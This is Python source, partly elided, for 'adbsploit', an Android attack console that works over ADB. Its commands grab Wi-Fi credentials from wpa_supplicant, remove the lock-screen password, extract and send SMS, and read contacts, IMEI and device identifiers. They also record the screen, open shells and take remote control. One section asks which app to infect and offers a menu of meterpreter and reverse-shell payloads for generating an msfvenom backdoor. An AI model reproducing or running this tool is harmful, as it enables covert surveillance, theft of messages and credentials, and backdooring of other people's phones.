...
try:
    ...
    print(
        'RUN: "pip install colorama rich adbutils pyfiglet" to install missing items.'
    )
...
def main():
    command = my_input(
        Fore.WHITE + "adbsploit" + Fore.RED + "(" + device + ")" + Fore.WHITE + " > "
    )
    if command == "help":
        help()
        main()
...
def devices(rstuff=False):
    ...
    if rstuff:
        ...
        for d in adbutils.adb.device_list():
            table.add_row(
                str(count), d.serial, d.prop.model, d.prop.name, d.prop.device
            )
...
def connect():
    print(
        ("[{0}+{1}] Enter the phone IP address to connect").format(Fore.RED, Fore.WHITE)
    )
...
def select():
    ...
    try:
        ...
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] That device doesn't exist...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    except Exception:
        print(
            arrow
            + ("[{0}+{1}] That device doesn't exist...").format(Fore.RED, Fore.WHITE)
        )
...
def forward():
    ...
    if device != "none":
        ...
        local = my_input(
            arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> "
        )
        print(
            ("[{0}+{1}] Enter the remote port to forward").format(Fore.RED, Fore.WHITE)
        )
        remote = my_input(
            arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> "
        )
        ...
        print(
            arrow
            + ("[{0}+{1}] You must select a device before...").format(
                Fore.RED, Fore.WHITE
            )
        )
...
def wifi():
    ...
    if device != "none":
        d = adbutils.adb.device(device)
        print(
            ("[{0}+{1}] Enter the state of the wifi (ON/OFF)").format(
                Fore.RED, Fore.WHITE
            )
        )
        state = my_input(
            arrow + " adbsploit" + Fore.RED + "(wifi) " + Fore.WHITE + "> "
        )
        if state == "on" or state == "ON":
            ...
            print(
                arrow
                + Fore.GREEN
                + "The wifi is now disabled on the device. To turn it on again you must plugged in"
            )
        else:
            print(
                arrow
                + ("[{0}+{1}] That state doesn't exists").format(Fore.RED, Fore.WHITE)
            )
            wifi()
    else:
        print(
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + Fore.RED
                + "An error has been occurred grabbing the wpa_supplicant"
            )
    else:
        print(
            arrow
...
def install():
    ...
    if device != "none":
        try:
            ...
            apk = my_input(
                arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            d.install(apk)
            ...
            print(
                arrow
                + Fore.RED
                + "An error has been occurred installing the APK. Check the path or the error related"
            )
    else:
        print(
            arrow
...
def uninstall():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Enter the package name").format(Fore.RED, Fore.WHITE)
            )
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(uninstall) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            d.uninstall(app)
            ...
            print(
                arrow
                + Fore.RED
                + "An error has been occurred uninstalling the APK. Check the package name or the error related"
            )
    else:
        print(
            arrow
...
def shell():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred opening the shell...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def shutdown():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred shutting down the device").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def kill_server():
    try:
        ...
        print(
            arrow
            + ("[{0}+{1}] An error ocurred killing the server...").format(
                Fore.RED, Fore.WHITE
            )
        )
...
def get_folder():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Enter the path of the folder to pull").format(
                    Fore.RED, Fore.WHITE
                )
            )
            path = my_input(
                arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Enter the path of the destination").format(
                    Fore.RED, Fore.WHITE
                )
            )
            name = my_input(
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred pulling the folder...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
    ...
    if device != "none":
        try:
            print(
                arrow
                + (
                    "[{0}+{1}] You want all the logs or only an app? (all/package_name) "
                ).format(Fore.RED, Fore.WHITE)
            )
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(logs) " + Fore.WHITE + "> "
            )
            if app == "all":
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred getting the logs...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def start_app():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(
                    Fore.RED, Fore.WHITE
                )
            )
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Specify the activity, if not leave it blank) ").format(
                    Fore.RED, Fore.WHITE
                )
            )
            activity = my_input(
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred starting the app...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def stop_app():
    ...
    if device != "none":
        try:
            ...
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(stop_app) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            d.app_stop(app)
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred stopping the app...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def clear_app():
    ...
    if device != "none":
        try:
            ...
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(clear_app) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            d.app_clear(app)
...
def show_ip():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred showing the ip...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def appinfo():
    ...
    if device != "none":
        try:
            ...
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(appinfo) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred obtaining the info...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def battery():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred obtaining the battery info...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def netstat():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred getting the netstat...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def airplane():
    ...
    if device != "none":
        try:
            ...
            status = my_input(
                arrow + " adbsploit" + Fore.RED + "(airplane) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            if status == "on":
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred with airplane mode...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
    ...
    if device != "none":
        try:
            print(
                arrow
                + (
                    "[{0}+{1}] Specify the type of sound to modify (media/call/system/notifications/all) "
                ).format(Fore.RED, Fore.WHITE)
            )
            type = my_input(
                arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Specify the sound leve 0-15 ").format(
                    Fore.RED, Fore.WHITE
                )
            )
            set = my_input(
            ...
            if type == "media":
                ...
                print(
                    arrow + Fore.GREEN + "The media volume is now set to " + set + "..."
                )
            elif type == "call":
                d.shell("media volume --stream 0 --set " + set)
                print(
                    arrow + Fore.GREEN + "The call volume is now set to " + set + "..."
                )
            elif type == "system":
                ...
                print(
                    arrow
                    + Fore.GREEN
                    + "The system volume is now set to "
                    + set
                    + "..."
                )
                ...
                print(
                    arrow
                    + Fore.GREEN
                    + "The notifications volume is now set to "
                    + set
                    + "..."
                )
            elif type == "all":
                ...
                print(
                    arrow
                    + Fore.GREEN
                    + "The all volume types is now set to "
                    + set
                    + "..."
                )
            else:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred with the sound...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def check_screen():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred checking the screen...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def dump_hierarchy():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred dumping hierarchy...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def keyevent():
    ...
    if device != "none":
        try:
            print(
                arrow + ("[{0}+{1}] Specify the keyevent").format(Fore.RED, Fore.WHITE)
            )
            key = my_input(
                arrow + " adbsploit" + Fore.RED + "(keyevent) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            d.keyevent(key)
...
def open_browser():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Specify the URL to open").format(Fore.RED, Fore.WHITE)
            )
            url = my_input(
                arrow + " adbsploit" + Fore.RED + "(open_browser) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            if url != "":
                d.open_browser(url)
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred opening the url...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def remove_password():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred removing the password...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def swipe():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Specify sx in the screen").format(Fore.RED, Fore.WHITE)
            )
            sx = my_input(
                arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Specify sy in the screen").format(Fore.RED, Fore.WHITE)
            )
            sy = my_input(
                arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Specify ex in the screen").format(Fore.RED, Fore.WHITE)
            )
            ex = my_input(
                arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Specify ey in the screen").format(Fore.RED, Fore.WHITE)
            )
            ey = my_input(
                arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> "
            )
            print(
                arrow + ("[{0}+{1}] Specify the duration").format(Fore.RED, Fore.WHITE)
            )
            duration = my_input(
                arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> "
            )
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred during the swipe...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def screen():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Specify the status of the screen (on/off)").format(
                    Fore.RED, Fore.WHITE
                )
            )
            status = my_input(
                arrow + " adbsploit" + Fore.RED + "(screen) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            if status == "on":
        ...
        try:
            ...
            if d.is_screen_on() == False:
                print(
                    arrow
                    + (
                        "[{0}+{1}] Specify the unlocking code, leave it blank if don't have code"
                    ).format(Fore.RED, Fore.WHITE)
                )
                code = my_input(
                    arrow
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred unlocking the device...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def show_macaddress():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred showing the mac address...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def screenshot():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Specify the name of the screenshot").format(
                    Fore.RED, Fore.WHITE
                )
            )
            name = my_input(
                arrow + " adbsploit" + Fore.RED + "(screenshot) " + Fore.WHITE + "> "
            )
            filename = name + ".png"
            # Using subprocess with a list and redirecting output via python file handle
            with open(filename, "wb") as f:
                subprocess.run(
                    ["adb", "-s", device, "exec-out", "screencap", "-p"], stdout=f
                )
            print(
                arrow
                + Fore.GREEN
                + "An image is created with the name "
                + filename
                + " ..."
            )
        except Exception:
            print(
                arrow
                + ("[{0}+{1}] An error ocurred making the screenshot...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def dump_meminfo():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] Specify the meminfo (all/package_name)").format(
                    Fore.RED, Fore.WHITE
                )
            )
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(dump_meminfo) " + Fore.WHITE + "> "
            )
            d = adbutils.adb.device(device)
            if app == "all":
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred dumping the meminfo...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def process_list():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred listing the processes..").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def tcpip():
    ...
    if device != "none":
        try:
            ...
            port = my_input(
                arrow + " adbsploit" + Fore.RED + "(tcpip) " + Fore.WHITE + "> "
            )
            if port == "":
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred enabling the tcpip mode..").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def extract_sms():
    ...
    if device != "none":
        try:
            print(
                arrow
                + ("[{0}+{1}] This option is still in BETA").format(
                    Fore.RED, Fore.WHITE
                )
            )
            d = adbutils.adb.device(device)
            output = d.shell(
                "content query --uri content://sms/ --projection _id:address:date:body"
            )
            print(output)
        except Exception:
            print(
                arrow
                + ("[{0}+{1}] An error ocurred extracting sms...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def delete_sms():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] Specify the SMS ID to delete").format(
                    Fore.RED, Fore.WHITE
                )
            )
            sms_id = my_input(
                arrow + " adbsploit" + Fore.RED + "(delete-sms) " + Fore.WHITE + "> "
            )
...
def send_sms():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] Specify the phone number (+34600112233)").format(
                    Fore.RED, Fore.WHITE
                )
            )
            number = my_input(
                arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> "
            )
            print(
                arrow
                + ("[{0}+{1}] Specify the sms message").format(Fore.RED, Fore.WHITE)
            )
            message = my_input(
                arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> "
            )
            d.shell(
                "service call isms 7 i32 0 s16 "
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred sending the sms...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
    ...
    if device != "none":
        try:
            ...
            print(
                ...
                + "Product Model: "
                + Fore.GREEN
                + d.shell("getprop ro.product.model")
            )
            print(
                arrow
                + "Android Version: "
            ...
            print(
                ...
                + "Android Id: "
                + Fore.GREEN
                + d.shell("settings get secure android_id")
            )
            print(
                arrow + "IMEI: " + Fore.GREEN + d.shell("service call iphonesubinfo 1")
            )
        except Exception:
            print(
                arrow
                + ("[{0}+{1}] An error ocurred getting the current app...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def recovery_mode():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred entering in recovery mode...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def fastboot_mode():
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred entering in fastboot mode...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def kill_process():
    ...
    if device != "none":
        try:
            ...
            pid = my_input(
                arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> "
            )
            ...
            print(
                arrow
                + ("[{0}+{1}] An error ocurred killing the process...").format(
                    Fore.RED, Fore.WHITE
                )
            )
    else:
...
def _run_scrcpy(args):
    if shutil.which("scrcpy") is None:
        print(
            arrow
            + Fore.RED
            + "scrcpy is not installed. Please install it from https://github.com/Genymobile/scrcpy"
        )
        return
...
def screenrecord():
    ...
    if device != "none":
        print(
            arrow
            + (
                "[{0}+{1}] Introduce the path and file name: (/home/user/Desktop/record.mp4)"
            ).format(Fore.RED, Fore.WHITE)
        )
        ans = my_input(
            arrow + " adbsploit" + Fore.RED + "(screenrecord) " + Fore.WHITE + "> "
        )
        if ans == "":
            ans = "record.mp4"
    ...
    if device != "none":
        try:
            ...
            print(
                arrow
                + (
                    "[{0}+{1}] Specify the App you want to infect: (com.whatsapp)"
                ).format(Fore.RED, Fore.WHITE)
            )
            app = my_input(
                arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> "
    ...
    if device != "none":
        if shutil.which("msfvenom") is not None:
            try:
                ...
                print(
                    arrow
                    + ("[{0}+{1}] Specify the payload: (com.whatsapp)").format(
                        Fore.RED, Fore.WHITE
                    )
                )
                table = Table()
                ...
                table.add_row(
                    ...
                    "Android Meterpreter Reverse HTTP Stager",
                )
                table.add_row(
                    "meterpreter_reverse_https",
                    "Android Meterpreter Reverse HTTPS Stager",
                )
                table.add_row(
                    "meterpreter_reverse_tcp", "Android Meterpreter Reverse TCP Stager"
                )
                table.add_row(
                    "meterpreter_reverse_http_inline",
                    "Android Meterpreter Reverse HTTP Inline",
                )
                table.add_row(
                    "meterpreter_reverse_https_inline",
                    "Android Meterpreter Reverse HTTPS Inline",
                )
                table.add_row(
                    "meterpreter_reverse_tcp_inline",
                    "Android Meterpreter Reverse TCP Inline",
                )
                table.add_row(
                    "shell_reverse_http", "Android Command Shell Reverse HTTP Stager"
                )
                table.add_row(
                    "shell_reverse_https", "Android Command Shell Reverse HTTP Stager"
                )
                table.add_row(
                    "shell_reverse_tcp", "Android Command Shell Reverse HTTP Stager"
                )
                console = Console()
                console.print(table)
                print(
                    arrow
                    + (
                        "[{0}+{1}] Specify the payload: (meterpreter_reverse_http)"
                    ).format(Fore.RED, Fore.WHITE)
                )
                payload = my_input(
                    arrow + " adbsploit" + Fore.RED + "(backdoor) " + Fore.WHITE + "> "
                )
                if payload == "":
                    print()
                    ...
                    print(
                        arrow
                        + ("[{0}+{1}] Select a correct payload...").format(
                            Fore.RED, Fore.WHITE
                        )
                    )
            except Exception:
                print(
                    arrow
                    + ("[{0}+{1}] An error ocurred generating the backdoor...").format(
                        Fore.RED, Fore.WHITE
                    )
                )
        else:
            print(
                arrow
                + (
                    "[{0}+{1}] ADBSploit use Metasploit for generating backdoors, you must install to use this option"
                ).format(Fore.RED, Fore.WHITE)
            )
            print(
                arrow
                + (
                    "[{0}+{1}] Install it via https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers "
                ).format(Fore.RED, Fore.WHITE)
            )
    else:
        print(
...
def clear():
    ...
    f = Figlet()
    list = ["graffiti", "slant", "avatar", "bell", "big", "doom", "standard", "stop"]
    f.setFont(font=random.choice(list))
    print(f.renderText(">_adbsploit"))
    print(
        "v0.3"
        + "\t \t \t \t"
        + "Developed by MesQ at "
        + Fore.RED
...
def help():
    ...
    table.add_column("Description", style="magenta")
    table.add_row(
        "devices", "List all devices detected", "select", "Select the device to use"
    )
    table.add_row(
        "connect", "Connect to the device", "list-forward", "List forward ports"
    )
    ...
    table.add_row(
        "airplane",
        "Manage the airplane mode",
        "dumpsys",
        "Provide info about system services (Needs Root)",
    )
    table.add_row(
        "list-apps",
    ...
    table.add_row(
        "install", "Install an apk", "install-remote", "Install an app via URL"
    )
    table.add_row(
        "uninstall", "Uninstall an app", "shell", "Open a shell on the device"
    )
    table.add_row("shutdown", "Shutdown the device", "reboot", "Reboot the device")
    table.add_row(
        "logs", "List the logs of the device", "show-ip", "Show the ip of the device"
    )
    table.add_row(
        "appinfo", "Obtain info of the package", "battery", "Show battery info"
    )
    table.add_row(
        "netstat",
        "Show the netstat of the device",
        "sound",
        "Control teh sound of the device",
    )
    table.add_row(
        "check-screen",
        "Check the status of the screen",
        "dump-hierarchy",
        "Dump the hierarchy info",
    )
    table.add_row(
        "keyevent",
    ...
    table.add_row(
        "swipe", "Swipe the screen", "screen", "Change the screen status ON/OFF"
    )
    table.add_row(
        "unlock-screen",
    ...
    table.add_row(
        "show-mac",
        "Show teh mac address of the device",
        "dump-meminfo",
        "Dump de memory info of the device",
    )
    table.add_row(
        "process-list",
        "List all the device process",
        "tcpip",
        "Change the device to tcp",
    )
    table.add_row(
        "extract-app",
        "Extract the apk of an installed app",
        "extract-contacts",
        "Show the contacts saved in the device",
    )
    table.add_row(
        "extract-sms",
        "Extract sms saved in the phone",
        "delete-sms",
        "Delete the sms specified",
    )
    table.add_row(
        "send-sms",
        "Send sms to the specified phone",
        "recovery-mode",
        "Enter the device in recovery mode",
    )
    table.add_row(
        "fastboot-mode",
        "Enter in fastboot mode",
        "device-info",
        "Get device info (IMEI, Android Id,...)",
    )
    table.add_row(
        "kill-process",
        "Kill the process on the device",
        "screenrecord",
        "Records the device screen",
    )
    table.add_row("remote-control", "Take control of the target device", "", "")
    table.add_row(
        "clear",
        "Clear the screen of adbsploit",
        "version",
        "Show the version of adbsploit",
    )
